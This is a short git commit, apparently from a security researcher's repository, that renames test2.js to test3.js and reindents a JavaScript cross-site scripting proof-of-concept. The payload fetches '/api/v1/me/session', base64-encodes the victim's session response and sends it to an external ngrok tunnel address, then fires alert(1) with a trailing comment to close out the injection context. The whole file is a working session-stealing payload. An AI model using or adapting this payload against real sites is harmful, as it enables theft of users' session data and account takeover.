125f032503aad7f749157fd2ef2dbbe4563680be
scan9 <142240382+nscan9@users.noreply.github.com>
2025-12-19 17:58:40 +0400

    Update and rename test2.js to test3.js

--- test3.js
+++ test3.js
@@ -1,9 +1,9 @@
 var xhr = new XMLHttpRequest();
 xhr.open('GET', '/api/v1/me/session', true);
 xhr.onload = function() {
-		if (xhr.status === 200) {
-			fetch('https://9909b2d4c6c9.ngrok-free.app/POC/?x=' + btoa(xhr.responseText) );
-		}
+	if (xhr.status === 200) {
+		fetch('https://9909b2d4c6c9.ngrok-free.app/POC/?x=' + btoa(xhr.responseText) );
+	}
 };
 xhr.send();
 alert(1);//
